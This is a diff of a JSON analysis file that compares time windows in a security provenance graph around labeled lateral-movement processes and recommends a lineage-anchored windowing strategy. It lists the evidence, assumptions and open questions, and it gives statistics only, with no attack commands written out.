-      "lineage_edge_total": 15,
-      "lineage_edge_coverage": 1.0
-    },
-    {
-      "name": "provenance_process_plus_minus_3600s",
-      "center_kind": "provenance_process",
-      "start": 1701622885.151,
-      "end": 1701630085.151,
-      "start_utc": "2023-12-03T17:01:25.151000+00:00",
-      "end_utc": "2023-12-03T19:01:25.151000+00:00",
-      "edge_count": 3014,
-      "labeled_edge_count": 0,
-      "lineage_edge_count": 15,
-      "duration_seconds": 7200.0,
-      "node_count": 828,
-      "labeled_node_count": 21,
-      "labeled_node_sublabel_counts": {
-        "lateralMovement": 10,
-        "discovery": 11
-      },
-      "network_artifact_count": 282,
-      "lineage_edge_total": 15,
-      "lineage_edge_coverage": 1.0
-    },
-    {
-      "name": "lineage_event_envelope",
-      "center_kind": "lineage_structure",
-      "start": 1701626485.151,
-      "end": 1701626525.453,
-      "start_utc": "2023-12-03T18:01:25.151000+00:00",
-      "end_utc": "2023-12-03T18:02:05.453000+00:00",
-      "edge_count": 36,
-      "labeled_edge_count": 0,
-      "lineage_edge_count": 15,
-      "duration_seconds": 40.30200004577637,
-      "node_count": 25,
-      "labeled_node_count": 10,
-      "labeled_node_sublabel_counts": {
-        "lateralMovement": 10
-      },
-      "network_artifact_count": 0,
-      "lineage_edge_total": 15,
-      "lineage_edge_coverage": 1.0
-    },
-    {
-      "name": "metadata_to_lineage_bridge",
-      "center_kind": "metadata_and_lineage",
-      "start": 1701623585.0,
-      "end": 1701626525.453,
-      "start_utc": "2023-12-03T17:13:05+00:00",
-      "end_utc": "2023-12-03T18:02:05.453000+00:00",
-      "edge_count": 1238,
-      "labeled_edge_count": 0,
-      "lineage_edge_count": 15,
-      "duration_seconds": 2940.4530000686646,
-      "node_count": 345,
-      "labeled_node_count": 10,
-      "labeled_node_sublabel_counts": {
-        "lateralMovement": 10
-      },
-      "network_artifact_count": 109,
-      "lineage_edge_total": 15,
-      "lineage_edge_coverage": 1.0
-    }
-  ],
-  "recommended_strategy": {
-    "strategy": "provenance-anchored lineage envelope with small padding",
-    "details": "Anchor on the same-PID Process timestamp, follow PID/PPID descendants, then use their observed incident-edge envelope (40.302 seconds here), optionally padded to about +/-60 seconds for context. Preserve the metadata timestamp as annotation only.",
-    "why": "Metadata-centered windows under one hour miss this PID; a metadata-to-process bridge admits substantial unrelated activity; unconstrained graph hops cross shared artifacts."
-  },
-  "observed_evidence": [
-    "The selected PID has two labeled lateralMovement Process entities at the same provenance timestamp.",
-    "The encoded command decodes to scp and ssh actions targeting 172.16.64.128.",
-    "PID/PPID links identify labeled scp/ssh descendants during the following 40.302 seconds.",
-    "All dataset WasTriggeredBy edges connect Process nodes with the same PID, not parent and child PIDs.",
-    "No network-socket Artifact is directly adjacent to the selected lineage despite the remote commands."
-  ],
   "assumptions": [
-    "Integer-equal PID/PPID values within five minutes represent OS parent/child lineage.",
-    "A Process node's populated start time or seen time is its relevant entity timestamp.",
-    "Used Process -> Artifact denotes an artifact used by the process; WasGeneratedBy Artifact -> Process denotes output attributed to the process."
-  ],
-  "unresolved_questions": [
-    "The exact semantic distinction and lifecycle order of seen-time and start-time Process IDs is undocumented.",
-    "PID 4127 is referenced as the attack shell's parent but has no Process entity in this capture.",
-    "The provenance has no direct network Artifact for the observed scp/ssh lineage.",
-    "The metadata timestamp source, timezone, and intended relationship to execution time remain unknown.",
-    "Host/session scope and PID-reuse guarantees remain undocumented.",
-    "Attack labels occur on Process nodes while the incident relationship rows are unlabeled; propagation rules are unknown."
+    "PID links attack metadata to Process records; differing timestamps are preserved.",
+    "Nearby PPID/PID matches are inferred lineage, not observed provenance edges.",
+    "Stored relationship names and from/to directions are not reinterpreted."
   ]
 }
